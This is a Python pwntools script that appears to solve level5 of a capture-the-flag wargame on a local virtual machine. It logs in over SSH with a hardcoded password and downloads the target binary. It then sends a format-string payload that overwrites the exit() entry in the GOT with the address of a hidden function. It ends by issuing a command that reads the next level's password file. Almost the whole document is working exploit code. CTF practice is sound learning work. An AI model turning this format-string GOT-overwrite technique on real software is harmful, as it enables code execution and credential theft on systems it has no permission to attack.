from pwn import *
import os

target = "/home/user/level5/level5"

# Change host according to your configuration
s = ssh(
    user="level5",
    host="192.168.56.8",
    password="0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a",
    port=4242
)


# Find exit() in GOT

s.download(target, "level5")
elf = ELF("./level5")
got_exit = elf.got["exit"]
o_addr = elf.sym["o"]
os.remove("level5")

# the format string offset
offset = 4

# the writes you want to perform
writes = {
    got_exit: o_addr,  # write o() address at exit() GOT address
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)

p = s.process("/home/user/level5/level5")
p.writeline(payload)
p.writeline("cat /home/user/level6/.pass")

#p.interactive()
p.stream()

p.close()
s.close()
